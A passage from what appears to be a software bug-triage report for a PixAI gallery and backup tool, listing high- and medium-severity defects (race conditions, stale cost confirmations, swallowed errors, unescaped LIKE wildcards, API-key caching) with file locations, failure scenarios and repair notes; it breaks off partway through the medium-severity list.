- **Category:** wrong-params
- **Batch:** -

**What it is.** build_reference_video_parameters always emits generateAudio/audioLanguage regardless of model, re-introducing the exact false-NSFW-refusal bug that build_video_parameters was specifically fixed to avoid via VIDEO_AUDIO_MODELS.

**How it fails.** Run `--reference-video --video-model v3.0.1 --ref-image <id1> --ref-image <id2> --prompt "@image1 ... @image2 ..." --confirm` (or any model outside VIDEO_AUDIO_MODELS, e.g. v3.0, v3.0.2, v2.7). The `rv` dict at lines 4932-4943 unconditionally sets `audioLanguage` and `generateAudio`, with no equivalent to the `if str(model).strip() in VIDEO_AUDIO_MODELS:` gate that build_video_parameters applies at line 4891-4893 for the exact same fields. The file's own survey comment at lines 4973-4992 documents that v3.0.1/v3.0.2/v2.7 must OMIT both fields, and that sending them on an unsupported model previously caused a real, otherwise-accepted submit to be refused with 'This image contains sensitive or NSFW content' on an image PixAI's own site accepted -- the same failure mode is reachable here through the unfixed sibling builder, silently blocking a legitimate reference-video generation with a misleading moderation error instead of the actual cause.

### ~~`H11` moonglade_backup.py:5386~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** The poller reads _GEN_DONE/_GEN_FAIL instead of its own drifted copy, so 'finished' and 'rejected' are recognised as terminal.
- **Area:** Generating & Cost
- **Category:** state-drift
- **Batch:** -

**What it is.** _poll_task_status classifies terminal task status with its own hardcoded tuples that have drifted from the file's own _GEN_DONE/_GEN_FAIL tables, so it fails to recognize 'finished' (a real success value in _GEN_DONE, line 6028) or 'rejected' (a real failure value in _GEN_FAIL, line 6029, also named explicitly in EmptyOutputsError's own docstring at line 99 as a real terminal failure) as terminal.

**How it fails.** A submitted generation ends up with PixAI status 'rejected' (already-terminal, already refunded per the file's own EmptyOutputsError/_GEN_FAIL handling elsewhere). run_generate / run_generate_video / run_reference_video / web_generate all poll it via _poll_task_status (lines 5591, 6176, 6292, 6121), whose success check (line 5382: completed/succeeded/success/done) and fail check (line 5386: failed/error/cancelled/canceled) neither matches 'rejected', so the loop just sleeps for the full poll_timeout (300s images, 600s video/reference-video) and then, since 'rejected' isn't in _never_dispatched's waiting/pending/queued set either, prints the false message 'the task is STILL RUNNING on PixAI ... recover it free once it finishes with --task-id' for a task that is already dead. A user who believes the CLI is just slow and re-runs --generate --confirm instead of recovering by id can be charged for a second generation.

### ~~`H12` moonglade_backup.py:6105~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** video_outputs reads the i2vPro block as well as referenceVideo (the two disagree on the key -- `prompts` vs `prompt`), so a plain image-to-video is no longer catalogued blank. Fixes --sync-videos' backfill too.
- **Area:** Generating & Cost
- **Category:** metadata-loss
- **Batch:** -

**What it is.** collect_generation always calls _download_video_task with an empty params dict, and video_outputs() (used at line 5697) only ever reads parameters.referenceVideo, never parameters.i2vPro, so every plain image-to-video generation collected through this path is cataloged with prompt/negative_prompt/video_duration/model_id permanently blank.

**How it fails.** A user submits a plain image-to-video generation (I2V, not multi-reference) from the web Generate drawer's Video tab. mg-notify.js polls /api/task-status; on phase=='done' the route calls core.collect_generation(session, tid, out_dir) with no params (moonglade_gallery.py ~line 4011/15013). collect_generation sees outputs.videos non-empty and calls _download_video_task(session, result, task_id, out, a, {}) (line 6105). Inside _download_video_task, video_outputs(result) builds `shared` only from result['parameters']['referenceVideo'] (empty for an i2vPro task, so shared={'prompt':'','duration':'','i2v_model':''}), and `sent = params.get('i2vPro') or params.get('referenceVideo') or {}` (line 5700) is also {} because params=={}. The resulting catalog row for that video permanently stores prompt_full='', negative_prompt='', video_duration='', and model_id='' -- unlike images, there's no backfill path for video metadata, so this is unrecoverable in the UI. The same empty-params call also fires for every --task-id video recovery.

### ~~`H13` moonglade_gallery.py:7657~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `onBasePick`'s failure path now re-runs the Go-button state update and surfaces the error.
- **Area:** Generating & Cost
- **Category:** state-transition-bug
- **Batch:** E

**What it is.** onBasePick's fetch-failure handler never re-evaluates the Generate button's disabled state (or shows any error), leaving Go stuck in a stale state after a failed model-version lookup.

**How it fails.** User has Model A selected with a resolved version_id and compatible LoRAs (Go button enabled). User clicks Model B in the picker; selected is immediately reassigned to Model B's raw object (no version_id yet), and the /api/model-version fetch for B fails (timeout/dropped connection). Only the success .then() branch calls refreshLoraNotes()->updateGoState(); the .catch() at line 7657 only resets the label text (`el('gen-selname').textContent=m.title`). The Go button keeps whatever enabled/disabled state Model A left it in -- typically still enabled. Clicking Generate then silently does nothing (payload().version_id is '' so generate()'s `if(!p.version_id) return;` guard at line 7993 no-ops), with no error message and no indication the pick failed, unlike the sibling 'no version!' label used when the fetch succeeds but returns zero versions. The only recovery is guessing to re-pick a model to retry the fetch.

### ~~`H14` moonglade_gallery.py:8130~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** The Edit and Generate tabs own separate debounce sequences, so an '?edit=' link no longer cancels the Generate tab's first price check. tests/test_fix.py updated: it pinned the shared `costSeq` by name, and the sharing WAS the defect.
- **Area:** Generating & Cost
- **Category:** race-condition
- **Batch:** -

**What it is.** debEditCost() and the Generate tab's debouncedCost() share one costTimer/costSeq pair, so opening the gallery via an '?edit=' deep link cancels the Generate tab's initial price check before it ever fires.

**How it fails.** On page load (DOMContentLoaded, line ~8701) 'if(document.getElementById("gen-dim-note") ...) Gen.refreshCost();' schedules a 250ms debounced price check via the shared costTimer. Immediately after, at lines 8707-8708, 'var em=...get("edit"); if(em) Gen.openEdit(em);' runs synchronously (this fires whenever the gallery is opened via an 'Edit this image' deep link, e.g. from an image detail page). Gen.openEdit -> setEditSource() calls debEditCost() (line 8130), which does clearTimeout(costTimer) and reschedules the SAME shared timer for editCost -- silently cancelling the Generate tab's pending refreshCost before it runs. If the user then switches back to the Generate tab and submits without touching any of the fields that re-trigger refreshCost (aspect/mode/count/size/width/height), the Generate cost badge never gets an actual price and the user hits Generate with no real cost check having ever completed for that tab.

### ~~`H15` moonglade_gallery.py:8196~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** The Fix dialog's quoted price is invalidated the moment the marked boxes change, not only when a price fetch completes.
- **Area:** Generating & Cost
- **Category:** stale-price-confirm
- **Batch:** -

**What it is.** The Fix confirm dialog's quoted price (fixCostVal) is only invalidated when a price fetch actually completes, not when the marked boxes change, so it can be stale for the exact box set that gets submitted.

**How it fails.** User draws one hand-fix box; fixCost() settles and fixCostVal=~300. User then draws a second box (debFixCost() schedules a new /api/price call 250ms out) and immediately clicks 'Fix marked regions' before that call resolves. fix() (line 8201) reads the still-stale fixCostVal=300 and shows 'Fix 2 marked regions? This spends about 300 PixAI credits' -- then runTask() submits fixBoxesScaled() for BOTH boxes (line 8220), which actually prices/charges for 2 regions. The user confirmed a real, unavoidable credit spend (Fix can never be covered by a free card, per this file's own comment at line 8213) based on a number that didn't match what was submitted.

### ~~`H16` moonglade_gallery.py:8665~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** bulkSendVideo decides from the selection's own data, not the cards on screen -- a video scrolled or filtered out of view slipped into an image-reference send. bulkSendCast had the identical hole; both now share ONE helper.
- **Area:** Generating & Cost
- **Category:** input-validation
- **Batch:** -

**What it is.** bulkSendVideo()'s exclusion of videos from image-reference sends only works if the video's card is currently in the DOM; the persisted (localStorage) selection is not DOM-backed, so an off-screen/filtered-out video slips through.

**How it fails.** selGet() (used at line 8663) reads selections from localStorage('gallery_sel'), independent of what's rendered. User selects a mix of images and one video on an unfiltered gallery view, then changes the search/filter or paginates (replacing the rendered card grid) before clicking the bulk bar's 'Send to Video'. For the selected video, document.getElementById('card-'+mid) at line 8664 now returns null (its card no longer exists in the DOM), so the 'if(card && card.getAttribute("data-video")==="1") return;' guard at line 8665 is skipped, and the video's media_id is pushed into refs and handed to Gen.addVideoRefs() as an image reference for the (expensive) video drawer -- exactly the case the inline comment says can't happen.

### `H17` moonglade_gallery.py:15060

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Job Tracker & Watcher
- **Category:** error-handling
- **Batch:** -

**What it is.** api_task_status()'s catch-all `except Exception` (meant only for transient PixAI blips per its own comment) also swallows permanent/local failures such as _gen_session() raising over a bad or missing PIXAI_API_KEY, reporting phase=running forever instead of ever surfacing the real error.

**How it fails.** config.json's PIXAI_API_KEY becomes invalid/expired while a Loom shot or gallery generation is mid-poll. Every /api/task-status?task_id=<tid> call now raises inside _gen_session() (line 15009) or core.generation_status(), which is caught by the bare `except Exception` at line 15060 and returned as {"phase":"running","status":"checking… (...)"} (line 15075-15076). The Job Tracker card spins indefinitely showing the job as still in progress -- never a clear failure -- for a condition that will never resolve itself, until (if ever) the much-slower orphan-reconciliation sweep in /api/jobs ages it out.

### ~~`H18` static/mg-notify.js:1390~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** 'stale' is in the Job Tracker's terminal set with its own toast, so a job PixAI never started is announced instead of vanishing quietly.
- **Area:** Job Tracker & Watcher
- **Category:** notification-state-stuck
- **Batch:** -

**What it is.** JobsCard.toastTransitions()'s TERMINAL set omits the 'stale' job status, so a generation the server's own orphan sweep marks stuck never fires a toast and simultaneously drops out of the busy-dot/badge count — exactly the case the Job Tracker exists to surface.

**How it fails.** A generation gets submitted and PixAI never picks it up (or the connection drops mid-render). The backend's orphan-reconciliation sweep ages it out and sets status:'stale' (row() at line ~1218 already has a dedicated branch for this, with its own icon and '.st-warn' styling, so it's a real, expected status). Because TERMINAL={done:1,failed:1,done_with_errors:1} at line 1390 doesn't include 'stale', toastTransitions() at line 1393 never satisfies `!TERMINAL[prev] && TERMINAL[st]` for that transition, so Toast.show() never fires. Meanwhile render()'s `running` counter (line 1368) only counts status==='running', so the #jobs-fab busy pulse and count badge both go quiet the moment the job goes stale. With the tray collapsed (its default state per LSK/localStorage), the user gets zero signal that anything went wrong — no toast, no busy indicator — and only discovers the stuck job by manually opening the tray and noticing a row they weren't told to look for.

### ~~`H19` moonglade_gallery.py:7232~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** The setup wizard's Sync button is restored on every failure path, with a visible reason.
- **Area:** Pickers & Drawer
- **Category:** error-handling
- **Batch:** E

**What it is.** The first-run setup wizard's 'Sync now' button is disabled on click but nothing can ever re-enable it if the sync later fails, permanently stranding a brand-new user.

**How it fails.** A new user pastes their API key and clicks 'Sync now'. Setup.firstSync() (line 7216) sets `var btn = event.target` and `btn.disabled = true`, then starts POST /api/panel/run and, on success, an interval calling tick() (line 7224) every 1.5s. tick() is a sibling top-level function inside the same Setup IIFE -- it has NO closure over firstSync's local `btn` variable. If the sync job later reports status:'failed' (e.g. a transient network hiccup or a PixAI API blip during the very first bulk pull -- entirely plausible on a fresh install), tick() at line 7232 shows 'Sync failed -- see the Panel for details' but has no way to call btn.disabled=false. The button is permanently disabled; the user's only recovery is a full page reload, which they have no way to know to do from the error message shown.

### ~~`H20` static/mg-model-picker.js:690~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** The resolve now confirms the entry is still selected before re-dispatching, so an un-picked LoRA is not resurrected.
- **Area:** Pickers & Drawer
- **Category:** race-condition
- **Batch:** D

**What it is.** In multi-select LoRA mode, an in-flight /api/model-version resolve fetch unconditionally re-dispatches `selected:true` for a LoRA the user already removed, silently resurrecting it in the host's selection list.

**How it fails.** User opens <mg-model-picker kind="lora" multi>, clicks a LoRA card to add it (pushes `entry` into `_selected`, fires `mg-pick {selected:true}`, starts a background fetch to `/api/model-version?...&all=1`). Before that fetch resolves, the user clicks the same card again to remove it — `_toggleMulti`'s remove branch (lines 660-671) splices `entry` out of `_selected` and fires `mg-pick {selected:false}`, but never cancels or flags the pending fetch. When the fetch resolves moments later, its `.then()` (lines 690-699) mutates the now-detached `entry` and fires ANOTHER `mg-pick {model: entry, selected:true}` unconditionally. A host that adds/removes LoRAs from its generation payload by listening to these events (the documented contract) re-adds the LoRA the user explicitly removed. The next Generate click submits with a LoRA the user thought they'd taken out, producing wrong output on a credit-spending generation.

### ~~`H21` static/mg-upscale-panel.js:455~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Two faults: the catalog's model_id is a VERSION id and travelled as model_id (the real cause of 'pick a model first'), and a missing model was a hard stop at all. OWNER-TESTED.
- **Area:** Pickers & Drawer
- **Category:** correctness
- **Batch:** E

**What it is.** `_payload()` sends an empty `prompt` for images with no recorded prompt, but `/api/generate` hard-rejects any submit with an empty prompt, so upscaling a locally-imported image — a case this very file's comments claim is fully supported once you pick a model — can never succeed.

**How it fails.** Import a local file (source='local'); `/api/image-meta` (moonglade_gallery.py) always returns `prompt: ''` for such rows since there's no PixAI task behind them. Open the Upscale panel on it: `_paintModel()` correctly detects the missing model and offers the model picker ('You imported this file... Pick one to upscale with.'). Pick a model, `_go.disabled` becomes false. Click Upscale: `_payload()` (line 455) sends `prompt: s.prompt || ''` = `''`. The server route rejects it before any spend with `{'error':'enter a prompt'}` (`if not args.prompt: return jsonify(...), 400` in moonglade_gallery.py's `/api/generate`). The panel surfaces that raw string via `_setMsg` (line 516), but there is no prompt field anywhere in the panel's UI to fix it — the documented 'pick a model and it works' flow is permanently broken for every locally-imported image.

### ~~`H22` static/picker-core.js:56~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** In-flight guard narrowed to appends only, plus a `loadSeq` token so a superseded page never appends into the grid.
- **Area:** Pickers & Drawer
- **Category:** state-management
- **Batch:** D

**What it is.** setFilter/setFilters/setQuery call load(false) without checking or queuing against the in-flight-fetch guard, so a filter change made while a scroll-triggered page fetch is in flight is silently dropped, and the stale page's results still get appended to the grid afterward.

**How it fails.** User scrolls the gallery picker near the bottom, triggering `loadMore()` -> `load(true)` for page 2 of the current filter (loading=true). Before that request returns, the user changes the rating/collection/type filter dropdown, triggering `setFilters()` (line 72), which updates the `filters` object and resets page=1 but then calls `load(false)` — which no-ops immediately because `loading` is still true (line 56). No fetch is ever issued for the new filter. When the stale page-2 response for the OLD filter arrives, `onResults(..., {append:true})` fires and mg-gallery-picker.js appends those old-filter images to the still-visible grid (append=true never clears it) alongside the previously-shown results, while the count display shows the old filter's total. The grid now permanently shows a mix of images from two different filter states — e.g. images below the user's chosen rating_min threshold remain pickable — until an unrelated later action happens to trigger a fresh non-append load.

### ~~`H23` moonglade_gallery.py:13128~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** Saving a new API key refreshes the in-memory copy, so rotating a revoked key takes effect without a restart.
- **Area:** Security & Access
- **Category:** state-caching
- **Batch:** -

**What it is.** POST /api/setup/save-key writes the newly validated PixAI API key to config.json but never updates moonglade_backup's module-level _cfg cache, so once a key is already loaded in memory, saving/rotating a new key silently has no effect on real generation/account calls until the process is restarted.

**How it fails.** Server is already running with core._cfg['PIXAI_API_KEY'] = keyA cached at import (moonglade_backup.py line 695). PixAI revokes keyA, or the owner wants to switch accounts; needs_key flips true again (gallery.py ~line 11549) and the wizard reappears, or the endpoint is called directly. The handler validates the new keyB with a hand-built session (lines 13089-13105, deliberately bypassing the cache) and reports 'Connected -- N credits', then writes keyB to config.json (line 13128). But every subsequent call in the same process -- /api/account, /api/generate, any _gen_session() -> core._make_session(None) -> load_token(None) -- checks core._cfg.get('PIXAI_API_KEY') first (moonglade_backup.py lines 788-793); since it is still non-empty (keyA), it never re-reads disk, so every real generation/account call keeps silently using the dead/wrong keyA until a manual restart, directly contradicting the success message the wizard just showed.

### `H24` loom/master-storyboard.jsx:237

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** The Loom
- **Category:** data-loss
- **Batch:** -

**What it is.** sSet/sGet/sList/sDel (storage persistence helpers) swallow all window.storage errors silently, so a failed autosave is indistinguishable from a successful one.

**How it fails.** window.storage.set() fails (quota exceeded from accumulated local thumbnail data at TPRE keys, or the storage backend errors) during the debounced project autosave; sSet's catch only does console.error(e) with no return signal, so the caller proceeds as if the save succeeded and the UI's saving/busy indicator clears normally. The user keeps editing, closes the tab, and discovers the storyboard was never actually persisted only on next load.

### `H25` loom/master-storyboard.jsx:1422

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** The Loom
- **Category:** data-loss
- **Batch:** -

**What it is.** Deleting a shot card fires immediately with no confirmation dialog and no undo, unlike every other destructive action in this file.

**How it fails.** User misclicks the '×' delete icon in the card's tightly-packed move-up/move-down/duplicate/delete button row (lines 1419-1422) — delCard(act.id, e.c) runs instantly (confirmed via its definition: `(aId, card) => setProject((p) => removeCard(p, aId, card.id))`, no confirm inside). The shot's prompt, frames, refs, notes, and attached generated-video result are gone permanently; a whole-file search found no undo mechanism anywhere, in contrast to deleteProject and delAct-with-cards which both gate on window.confirm.

### ~~`H26` loom/master-storyboard.jsx:2736~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** A failed shot is put back to a state later batches pick up, instead of sitting at 'wip' forever and being silently skipped.
- **Area:** The Loom
- **Category:** correctness
- **Batch:** -

**What it is.** A submit failure during 'Generate all' (server-reported error or network exception) leaves the shot's persisted status stuck at 'wip' forever, silently and permanently dropping it from every future batch run.

**How it fails.** generateShot writes `setCardStatus(c.id, { status: "wip" })` optimistically (line 2736) before the `/api/loom/generate` fetch. If PixAI returns a normal JSON error (content-policy rejection, insufficient credits, etc. — handled at lines 2743-2746) or the fetch itself throws (lines 2766-2769), only the ephemeral, in-memory `genState` is set to phase 'error' — `setCardStatus` is never called again to revert status or attach a `pendingTaskId`. On reload, `genState` is wiped and the resume-on-load effect (lines 2873-2881) only re-attaches a poll for cards that have BOTH `status==="wip"` AND a `pendingTaskId` (this shot has neither the latter), so the card shows indefinitely 'wip' with zero error indication, and `batchGenerate`'s own `todo` filter (`status !== "done" && status !== "wip"`, line 3062) permanently excludes it from every subsequent 'Generate all' click — a single ordinary submit rejection quietly and irreversibly removes a shot from the batch pipeline.

### `H27` loom/src/loom-core.js:254

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** The Loom
- **Category:** correctness
- **Batch:** -

**What it is.** shotText()'s open/close-frame description lines are gated on c.connect === "flf" instead of c.mode === "FLF", so an FLF-mode shot without the "First→Last" continuity chip gets no frame description in its assembled prompt even though both frame images are still uploaded.

**How it fails.** Select a shot and set Mode to FLF via the Video tab's mode picker (Mode and Continuity are documented/coded as independent controls — see setShotMode/setShotConnect in loom-mutations.js, which only forces mode when connect is set TO "flf", never the reverse). Leave Continuity at its default "New scene" (or pick "Cut"/"Extend prev"). Fill in Opening and Closing frame images with descriptions and Generate. shotImageRefs()/shotPayload() (correctly gated on c.mode==="FLF", matching the loom-mutations.js comment that mode alone controls what reaches generation) still uploads both frame images as @image1/@image2, but shotText()'s `if (c.connect === "flf")` block never fires, so the actual prompt text sent to PixAI never says what either image is ("Opening frame @imageN: ..."/"Closing frame @imageN: ..." both missing). The model gets two structurally load-bearing reference images with zero textual explanation — for the routine, everyday case of choosing FLF mode without also toggling the First→Last continuity chip. (The one existing test for this text, loom/test/loom-core.test.js:250-260, only exercises connect:"flf" with mode left at makeCard()'s default "R2V" — a combination that's actually unreachable through the real UI's coupling logic — so the reachable broken case, mode:"FLF" with connect anything else, has zero test coverage.)

### `H28` loom/src/loom-core.js:278

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** The Loom
- **Category:** correctness
- **Batch:** -

**What it is.** shotText()'s "Keep consistent"/"Other references" loops list every cast member and ref on the shot, not just the ≤6 that shotImageRefs()/shotPayload() actually include under PixAI's 6-image cap, so a dropped item still prints a text line citing its stale, unrelated tag.

**How it fails.** Give one shot 2 frame images (FLF mode) plus 5 cast members toggled on — 7 image items total. shotImageRefs() (line 173, .slice(0,6)) caps the real `images` array sent to /api/loom/generate at 6, silently dropping the lowest-priority cast member. shotText()'s `usedCast` loop (lines 273-280) is unbounded and still runs over all 5 cast members; for the dropped one, positionTag() returns null (it's not in the truncated items list) and falls back to `as.tag`, e.g. "@image5" (its raw, stable, project-global tag). The assembled prompt tells PixAI to "maintain exact appearance from @image5" even though no image numbered @image5 was uploaded in this submission — or, if another cast member's own global tag happens to equal that number, the model is pointed at the wrong picture entirely. This is the exact numbering-collision failure class the file's own extensive header comments (lines 98-172) describe having fixed for other cases, reappearing here specifically for the >6-reference overflow, and it's untested (no test in loom-core.test.js exercises more than a couple of image refs on one shot).


## MEDIUM

### `M01` moonglade_backup.py:1583

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Backup & Import
- **Category:** error-handling
- **Batch:** -

**What it is.** resolve_media() has zero retries and swallows requests.exceptions.SSLError into the same silent (None, {}) path as an ordinary failure, unlike gql()/download() which raise a clear _ssl_help() message for the same exception type.

**How it fails.** The media CDN host (MEDIA_BASE) hits a TLS trust/interception issue distinct from the GraphQL API host (the exact corporate-proxy scenario this codebase's truststore.inject_into_ssl() exists to handle). Every call prints only "no url for media <id>" (visible identically to a genuinely missing image) instead of the actionable _ssl_help() message gql()/download() give for the identical exception, so the user never learns it's a fixable local TLS problem rather than PixAI not having the image.

### `M02` moonglade_backup.py:2366

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Backup & Import
- **Category:** correctness
- **Batch:** -

**What it is.** _market_row derives should_blur from isNsfw while model_search_rest derives it from the API's own shouldBlur flag, despite both being documented as the SAME interchangeable row shape.

**How it fails.** The same NSFW-flagged model is searched by keyword (REST path, line 2168: should_blur = flag['shouldBlur'], respects the viewer's actual content settings) and then browsed via the Market or Bookmarks tab (GraphQL path, line 2366: should_blur = bool(isNsfw), ignores viewer settings entirely). A user whose account/preferences would normally show it unblurred sees it forced-blurred on Market/Bookmarks but not on Search, or vice versa for a model where isNsfw and shouldBlur disagree -- inconsistent blur behavior for identical content depending on which tab served the row.

### `M03` moonglade_backup.py:2694

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Backup & Import
- **Category:** error-handling
- **Batch:** -

**What it is.** _bookmarks_persisted never checks r.status_code and only raises on JSON-decode failure or a top-level 'errors' key, so a non-GraphQL-shaped server error silently becomes an empty bookmark list.

**How it fails.** The ad-hoc bookmarks query is refused (PixAIError) and falls back to _bookmarks_persisted; the persisted GET hits an auth/gateway failure (e.g. stale U3T) that returns valid JSON without an 'errors' array (e.g. a plain REST-style {"statusCode":401,...} body). The function falls through to `return ... or {}`, and model_bookmarks_gql reports {"results": [], "has_more": False} -- the user sees an empty Bookmarks tab instead of any indication the request actually failed.

### `M04` moonglade_backup.py:4377

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Backup & Import
- **Category:** error-handling
- **Batch:** -

**What it is.** video_faststart() only logs a remux failure when ffmpeg raises a Python exception; a non-zero ffmpeg return code (a normal failure mode) is swallowed completely with no message even under -v, and run_faststart_videos's fixed/skipped counters silently under-count with no indication of which file is still broken.

**How it fails.** A captured i2v mp4 with a stream anomaly that ffmpeg's `-c copy -movflags +faststart` refuses to remux causes subprocess.run's returncode to be non-zero without raising; video_faststart returns False silently (no vlog call, contradicting its own comment that 'an odd ffmpeg failure must at least show under -v'). run_faststart_videos then increments neither fixed nor skipped for that file, so fixed+skipped < total with no way to tell which video is still not iOS-playable after the user ran the exact tool meant to fix that.

### `M05` moonglade_backup.py:7202

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Backup & Import
- **Category:** error-handling
- **Batch:** -

**What it is.** list_claims() swallows any PixAIError from GET /v2/claim into an empty list, and run_claims() then reports that identical empty result as 'No claimable rewards found' regardless of whether the account truly has zero rewards or the fetch simply failed.

**How it fails.** User has a ready daily-credit or stamina claim, but GET /v2/claim returns a transient 5xx or times out; list_claims (lines 7201-7205) catches PixAIError and returns [], and run_claims (lines 7232-7234) prints 'No claimable rewards found (read-only; nothing changed).' -- indistinguishable from genuinely having nothing to claim. The user has no signal to retry and may believe (incorrectly) that no reward is currently available, leaving a real claimable reward unclaimed.

### `M06` moonglade_backup.py:7457

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Backup & Import
- **Category:** correctness
- **Batch:** -

**What it is.** _count_backup_images (used by --catalog-stats) only excludes `gallery/` and `_duplicates/` from its disk scan, but not the `_deleted/` soft-delete quarantine folder (DELETED_DIRNAME), even though run_download's own disk scanner in the same file (line 7978) explicitly excludes that same directory, citing a prior real bug (B11) from failing to do so.

**How it fails.** A user soft-deletes a batch of images via the gallery's trash feature (moved into pixai_backup/_deleted/, still real files on disk pending a permanent purge), then runs `python moonglade_backup.py --catalog-stats` -- which the Wiki's 'Reclaiming disk space' section recommends as the way to see 'where the space actually goes' before deciding what to clean up. The reported 'Image files on disk' count and byte total silently include the trashed/quarantined images as if they were still part of the active library, overstating true library size and undermining the exact disk-usage decision the command is meant to inform.

### `M07` moonglade_backup.py:8146

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Backup & Import
- **Category:** resource-abuse
- **Batch:** -

**What it is.** run_download's own inline parallel downloader (the code path used by the default `--workers 4`) never applies `args.delay` pacing to the per-image resolve_media/download calls -- only the page-listing fetch and the per-task full-meta fetch are paced -- while the serial branch explicitly sleeps `args.delay` after every successful download (line ~8298), and the Wiki's Download-tuning table documents `--delay` as a politeness throttle that 'applies to most commands, not just downloads.'

**How it fails.** Run the default, most common command `python moonglade_backup.py` (workers default to 4, so the parallel branch is used) on a large library. Each page's worklist of up to 250 media_ids is dispatched to a ThreadPoolExecutor whose `_work()` calls `resolve_media(session, mid)` (a real GraphQL request, confirmed at line 1572 -- no internal throttling) and then `download()` back-to-back with zero pacing between requests, unlike the serial path or the project's own `_parallel_map` helper (which this file's docstring at line ~7638 explicitly says was fixed for exactly this failure mode: 'it should not switch itself off because a flag was passed'). This silently violates the project's standing 'be polite to PixAI's servers' rule and the documented --delay contract for the single highest-traffic, default-configuration code path in the whole tool, risking server-side throttling/rate-limiting on a real account during ordinary full or incremental backups.

### ~~`M08` moonglade_gallery.py:546~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `_like_escape()` added; every literal LIKE filter now escapes % and _ and carries a paired ESCAPE '\\' clause.
- **Area:** Catalog & Misc
- **Category:** correctness
- **Batch:** A

**What it is.** Collection filtering builds a raw SQL LIKE pattern from the collection name without escaping % or _, so a collection name containing either character silently turns the filter into a wildcard match instead of the exact match the code comment and the Wiki both promise.

**How it fails.** User creates a collection literally named "100%" (a plausible name, e.g. tracking '100% Done' pieces) via + Add to Collection, then filters the gallery by that collection from the Collection dropdown (or types collection:"100%" in the search box, per Gallery.md's documented syntax). _build_where's clause `(',' || COALESCE(collections,'') || ',') LIKE ?` with param `%,100%,%` has an un-escaped '%' inside the name, so SQLite treats it as a wildcard: the query matches EVERY row that has any collection at all, not just rows tagged "100%". The grid silently shows images from unrelated/other collections mixed in, directly contradicting Collections.md's 'Matching is exact (so "Elf" won't match "Elf Portraits")' and Gallery.md's 'collection:"Elf Portraits" exact collection name, same as the dropdown'. The same unescaped-LIKE pattern is reused verbatim in _operator_clause's 'collection' kind (line 523-524), and the same missing-escape bug independently affects the art_tag filter (line 565-566) and lora filter (line 568-569) for any tag/LoRA name containing % or _ (e.g. a LoRA literally named 'add_detail_xl', a very common naming convention).

### ~~`M09` moonglade_gallery.py:652~~ &nbsp; FIXED

- **Triage:** `[x]` fixed 2026-07-27 — nothing to log unless you want it recorded
- **Repair:** `add_to_collection`/`remove_from_collection` now hold `_COLLECTIONS_LOCK` across the batch's read-modify-write.
- **Area:** Catalog & Misc
- **Category:** race-condition
- **Batch:** C

**What it is.** add_to_collection and remove_from_collection do an unlocked read-modify-write per media_id (SELECT collections, then UPDATE with the whole recomputed value), so two concurrent requests touching the same image's collections column race and one edit is silently lost with no error.

**How it fails.** The app explicitly supports concurrent multi-device access (Gallery.md: 'sign in from a tablet... Everything here needs a login as of v2.0.0... available from any device'). If the same image is curated from two sessions at nearly the same time -- e.g. desktop adds image X to collection "Vacation" while a tablet session simultaneously adds the same image X to collection "Favorites" -- both requests read collections='' before either commits, then each writes back only its own single name. Whichever UPDATE lands second overwrites the first, so the DB ends up with only one of the two collection tags even though both HTTP requests returned success (changed=1) to their respective clients. Same race applies to remove_from_collection (line 676) racing against a concurrent add. No locking or transaction guards this read-modify-write cycle, unlike the telemetry counters in this same file which do have an explicit cross-process file lock (_telem_file_lock) for exactly this class of concurrent-write hazard.

### `M10` moonglade_gallery.py:4838

- **Triage:** `[ ]` log  `[ ]` fix  `[ ]` wontfix
- **Area:** Catalog & Misc
- **Category:** correctness
- **Batch:** -

**What it is.** The shared star-rating widget updates its internal 'current rating' tracker synchronously on click, before the server confirms the write, and only rolls the visible stars forward on an explicit ok:true response with no rollback on failure — so a failed/late rating POST leaves the DOM and the in-memory rating permanently out of sync.

